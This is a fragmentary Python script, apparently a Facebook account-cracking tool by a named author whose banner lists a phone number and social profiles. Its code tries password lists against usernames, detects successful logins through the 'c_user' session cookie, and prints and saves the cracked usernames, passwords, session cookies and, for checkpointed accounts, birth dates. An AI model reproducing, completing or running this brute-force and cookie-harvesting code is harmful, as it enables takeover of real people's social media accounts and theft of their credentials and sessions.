...
\033[1;92m [•] \033[1;31;1mAuthor    : \033[1;92m Arafat-mahin

\033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m +8801925798757  

\033[1;92m [•] \033[1;31;1mFacebook  :\033[1;92m  Facebook.com/arafatmahin310

\033[1;92m [•] \033[1;31;1mGithub    : \033[1;92m Github.com/arafat-mahin310
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Arafat-mahin-CP] ", "")}{N}')

                try:

                    log_hasil(titid[0].replace("[Arafat-mahin-CP] ", ""), titid[1])
            ...
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}Arafat-mahinmeta1.py{N}'");exit()
...
# PROSES CRACK METODE 3 in 1
    ...
    def __metode__(self, cebok, user, pasw):
        ...
        animasi = random.choice(["\x1b[1;92m[Arafat-mahin]","\x1b[1;92m[Arafat-mahin]","\x1b[1;92m[Arafat-mahin]","\x1b[1;92m[Arafat-mahin]","\x1b[1;92m[Arafat-mahin]","\x1b[1;92m[Arafat-mahin]","\x1b[1;92m[Arafat-mahin]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print('\r %s[Arafat-mahin-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))

                        print(f'\r {H}Cookie   : {coki}\n')

                    elif "y" in Apk:

                        print(f'\r %s[Arafat-mahin-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))

                        print(f'\r {H}Cookie   : {coki}')

                    wrt = '[Arafat-mahin-OK] %s • %s' % (user,pw)
                    ...
                    try:
                        ...
                        print('\r %s[Arafat-mahin-CP] %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))

                        wrt = '[Arafat-mahin-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    ...
                    wrt = '[Arafat-mahin-CP] %s • %s' % (user,pw)
...
def alok():
    ...
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/+8801925798757?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);alok()
...
def infoauthor():
        ...
        if upd =="":
            ...
            os.system('xdg-open https://wa.me/+8801925798787?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);file()
